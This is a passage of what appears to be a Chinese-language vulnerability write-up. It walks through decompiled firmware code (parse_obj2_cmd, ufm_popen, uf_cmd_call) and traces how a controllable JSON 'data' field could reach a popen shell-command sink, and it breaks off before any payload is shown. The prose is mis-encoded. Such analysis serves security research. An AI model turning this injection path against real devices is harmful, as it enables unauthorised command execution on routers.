)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">string</span> = json_object_get_string(params_module);</span><br><span class="line">              <span class="keyword">if</span> ( <span class="built_in">string</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v21 = strdup(<span class="built_in">string</span>);</span><br><span class="line">                *(_DWORD *)(ptr_2 + <span class="number">8</span>) = v21;</span><br><span class="line">                <span class="keyword">if</span> ( v21 )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;remoteIp&quot;</span>, &amp;params_module) != <span class="number">1</span></span><br><span class="line">                    || (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(params_module) - <span class="number">5</span>) &gt;= <span class="number">2</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    *(_DWORD *)(ptr_2 + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_59;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v22 = json_object_get_string(params_module);</span><br><span class="line">                  <span class="keyword">if</span> ( !v22 )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_59;</span><br><span class="line">                  v23 = strdup(v22);</span><br><span class="line">                  *(_DWORD *)(ptr_2 + <span class="number">20</span>) = v23;</span><br><span class="line">                  <span class="keyword">if</span> ( v23 )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_59;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">              &#125;</span><br><span class="line">              uf_log_printf(uf_client_log, <span class="string">&quot;(%s %s %d)obj_module is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)obj_module is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)params is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_129:</span><br><span class="line">          cmd_msg_free(ptr_2);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v17 = <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)ptr_2 = v17;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">  &#125;                                             <span class="comment">// end</span></span><br><span class="line">  v8 = (<span class="type">const</span> <span class="type">char</span> *)strdup(method_2);</span><br><span class="line">  *(_DWORD *)(ptr_2 + <span class="number">8</span>) = v8;</span><br><span class="line">  <span class="keyword">if</span> ( !v8 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">  <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)cmd_msg-&gt;module:%s&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">295</span>, v8);</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;url&quot;</span>, &amp;params_module) == <span class="number">1</span> )<span class="comment">// æ— </span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = json_object_get_string(params_module);</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = strdup(v9);</span><br><span class="line">      *(_DWORD *)(ptr_2 + <span class="number">28</span>) = v10;</span><br><span class="line">      <span class="keyword">if</span> ( !v10 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)cmd_msg-&gt;url_str:%s&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">306</span>,</span><br><span class="line">        *(<span class="type">const</span> <span class="type">char</span> **)(ptr_2 + <span class="number">28</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;sn&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = json_object_get_string(params_module);</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = strdup(v11);</span><br><span class="line">      *(_DWORD *)(ptr_2 + <span class="number">32</span>) = v12;</span><br><span class="line">      <span class="keyword">if</span> ( !v12 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)cmd_msg-&gt;sn:%s&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">318</span>, *(<span class="type">const</span> <span class="type">char</span> **)(ptr_2 + <span class="number">32</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;ip&quot;</span>, &amp;params_module) != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(params_module) - <span class="number">5</span>) &gt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  &#125;</span><br><span class="line">  method_string_1 = json_object_get_string(params_module);</span><br><span class="line">  <span class="keyword">if</span> ( method_string_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = (<span class="type">const</span> <span class="type">char</span> *)strdup(method_string_1);</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">20</span>) = v14;</span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">        uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)cmd_msg-&gt;ip:%s&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">333</span>, v14);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_128:</span><br><span class="line">    uf_log_printf(uf_client_log, <span class="string">&quot;(%s %s %d)strdup failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_129;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_28:</span><br><span class="line">  *(_DWORD *)ptr_2 = <span class="number">5</span>;</span><br><span class="line">  *(_DWORD *)(ptr_2 + <span class="number">4</span>) = strdup(<span class="string">&quot;get&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)cmd_msg-&gt;ctype:%d&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">339</span>, <span class="number">5</span>);</span><br><span class="line">LABEL_59:</span><br><span class="line">  v24 = *(_DWORD *)ptr_2 != <span class="number">2</span>;</span><br><span class="line">  *(_BYTE *)(ptr_2 + <span class="number">40</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_BYTE *)(ptr_2 + <span class="number">41</span>) = v24;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;async&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v26 = v25;</span><br><span class="line">    <span class="keyword">if</span> ( v25 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v25 == <span class="number">48</span> || !<span class="built_in">strcmp</span>(v25, <span class="string">&quot;false&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">41</span>) = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *v26 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v26, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_WORD *)(ptr_2 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v26);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;force&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v27 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v28 = v27;</span><br><span class="line">    <span class="keyword">if</span> ( v27 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v27 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v27, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">43</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v28);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;configId_not_change&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v29 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v30 = v29;</span><br><span class="line">    <span class="keyword">if</span> ( v29 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v29 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v29, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">44</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v30);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------configId_not_change:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">481</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">44</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;buf&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">36</span>) = json_object_get_int(params_module);</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;from_url&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v31 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v32 = v31;</span><br><span class="line">    <span class="keyword">if</span> ( v31 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v31 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v31, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">45</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------from_url:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">500</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">45</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;from_file&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v33 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v34 = v33;</span><br><span class="line">    <span class="keyword">if</span> ( v33 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v33 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v33, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">47</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v34);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------from_file:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">513</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">47</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;multi&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v35 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v36 = v35;</span><br><span class="line">    <span class="keyword">if</span> ( v35 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v35 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v35, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">48</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v36);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------multi:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">526</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">48</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;not_commit&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v37 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v38 = v37;</span><br><span class="line">    <span class="keyword">if</span> ( v37 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v37 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v37, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">46</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v38);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------not_commit:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">538</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">46</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;execute&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v39 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v40 = v39;</span><br><span class="line">    <span class="keyword">if</span> ( v39 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v39 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v39, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">42</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v40);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v41 = ptr_2;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;data&quot;</span>, &amp;params_module) == <span class="number">1</span></span><br><span class="line">    &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(params_module) - <span class="number">4</span>) &lt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v42 = json_object_get_string(params_module);</span><br><span class="line">    <span class="keyword">if</span> ( v42 )</span><br><span class="line">    &#123;</span><br><span class="line">      v43 = strdup(v42);</span><br><span class="line">      *(_DWORD *)(ptr_2 + <span class="number">12</span>) = v43;</span><br><span class="line">      <span class="keyword">if</span> ( !v43 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v41;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤„ç†dataçš„éƒ¨åˆ†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;data&quot;</span>, &amp;params_module) == <span class="number">1</span></span><br><span class="line">  &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(params_module) - <span class="number">4</span>) &lt; <span class="number">3</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v42 = json_object_get_string(params_module);</span><br><span class="line">  <span class="keyword">if</span> ( v42 )</span><br><span class="line">  &#123;</span><br><span class="line">    v43 = strdup(v42);</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">12</span>) = v43;</span><br><span class="line">    <span class="keyword">if</span> ( !v43 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä» JSON å¯¹è±¡ <code>params</code> ä¸­æå– â€œdataâ€ å­—æ®µï¼Œå¹¶æ£€æŸ¥å…¶ç±»å‹æ˜¯å¦ä¸ºå­—ç¬¦ä¸²ã€æ•°ç»„æˆ–å¯¹è±¡ã€‚å¦‚æœæ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œåˆ™å¤åˆ¶å­—ç¬¦ä¸²å¹¶å°†å…¶æŒ‡é’ˆå­˜å‚¨åœ¨æŒ‡å®šçš„ä½ç½®ã€‚å¦‚æœå†…å­˜åˆ†é…å¤±è´¥ï¼Œåˆ™è·³è½¬åˆ°é”™è¯¯å¤„ç†ä»£ç ã€‚</p><blockquote><ol><li><code>json_type_null</code> (å€¼ä¸º 0)</li><li><code>json_type_boolean</code> (å€¼ä¸º 1)</li><li><code>json_type_double</code> (å€¼ä¸º 2)</li><li><code>json_type_int</code> (å€¼ä¸º 3)</li><li><code>json_type_object</code> (å€¼ä¸º 4)</li><li><code>json_type_array</code> (å€¼ä¸º 5)</li><li><code>json_type_string</code> (å€¼ä¸º 6)</li></ol></blockquote><p>è¿™è¾¹è®°ä½å¯æ§å­—æ®µçš„åç§»12</p><p>åˆ°äº†ä¹‹åæœ‰ä¸€ä¸ª<code>uf_cmd_call</code>å‡½æ•°ï¼Œä¹ä¸€çœ‹æ„Ÿè§‰æœ‰å‘½ä»¤æ‰§è¡Œç‚¹ï¼Œå› æ­¤è·Ÿè¿›ï¼Œå¯»æ‰¾å‘½ä»¤æ‰§è¡Œç‚¹</p><h5 id="ufm-popen"><a href="#ufm-popen" class="headerlink" title="ufm_popen"></a>ufm_popen</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">ufm_popen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">51200</span>]; <span class="comment">// [sp+28h] [-C808h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [sp+C828h] [-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  pthread_mutex_lock(&amp;unk_435F30);</span><br><span class="line">  v4 = popen(a1, <span class="string">&quot;r&quot;</span>);                           <span class="comment">//æ‰§è¡Œa1æŒ‡å‘çš„shellå‘½ä»¤</span></span><br><span class="line">  pthread_mutex_unlock(&amp;unk_435F30);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)cmd[%s] open failed!&quot;</span>, <span class="string">&quot;ufm_common.c&quot;</span>, <span class="string">&quot;ufm_popen&quot;</span>, <span class="number">47</span>, a1);</span><br><span class="line">    v6 = (_DWORD *)_errno_location();</span><br><span class="line">    v5 = (<span class="type">const</span> <span class="type">char</span> *)strerror(*v6);</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)popen failed. %s, with errno %d.&quot;</span>, <span class="string">&quot;ufm_common.c&quot;</span>, <span class="string">&quot;ufm_popen&quot;</span>, <span class="number">48</span>, v5, *v6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = <span class="number">512</span>;</span><br><span class="line">  v7 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">  *a2 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory full!&quot;</span>, <span class="string">&quot;ufm_common.c&quot;</span>, <span class="string">&quot;ufm_popen&quot;</span>, <span class="number">55</span>);</span><br><span class="line">    pclose(v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *v7 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !feof(v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">    <span class="keyword">if</span> ( fgets(v10, <span class="number">51200</span>, v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_str_append(a2, v10, &amp;v11);</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strlen</span>(*a2) &gt;= <span class="number">0x9C4001</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)string oversize!&quot;</span>, <span class="string">&quot;ufm_common.c&quot;</span>, <span class="string">&quot;ufm_popen&quot;</span>, <span class="number">69</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*a2);</span><br><span class="line">    *a2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pthread_mutex_lock(<span class="number">4415280</span>);</span><br><span class="line">  pclose(v4);</span><br><span class="line">  pthread_mutex_unlock(<span class="number">4415280</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªå‡½æ•°å…¶å®æ˜¯æ‰§è¡Œä¸åˆ°çš„ï¼Œè®©æˆ‘å¨“å¨“é“æ¥</p><h4 id="uf-cmd-call"><a href="#uf-cmd-call" class="headerlink" title="uf_cmd_call"></a>uf_cmd_call</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">uf_cmd_call</span><span class="params">(<span class="type">int</span> addr, <span class="type">int</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line"> .........</span><br><span class="line">  v16 = *(<span class="type">unsigned</span> __int8 *)(addr + <span class="number">45</span>);        <span class="comment">// æ²¡æœ‰ç‰¹åˆ«è®¾ç½®å°±æ˜¯0</span></span><br><span class="line">  HIBYTE(_20_23_is_data[<span class="number">4</span>]) = v13 != <span class="number">5</span>;</span><br><span class="line">  _20_23_is_data[<span class="number">5</span>] = v15;</span><br><span class="line">  v17 = *(<span class="type">const</span> <span class="type">char</span> **)(addr + <span class="number">8</span>);</span><br><span class="line">  _20_23_is_data[<span class="number">0</span>] = addr;</span><br><span class="line">  _20_23_is_data[<span class="number">14</span>] = (<span class="type">int</span>)v17;</span><br><span class="line">  <span class="keyword">if</span> ( !v16 )               <span class="comment">//è¿™ä¸ªç›´æ¥æ‰§è¡Œ</span></span><br><span class="line">  &#123;</span><br><span class="line">    _20_23_is_data[<span class="number">20</span>] = *(_DWORD *)(addr + <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_86;    </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤ä¼šç›´æ¥è·³åˆ°LABEL_86</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 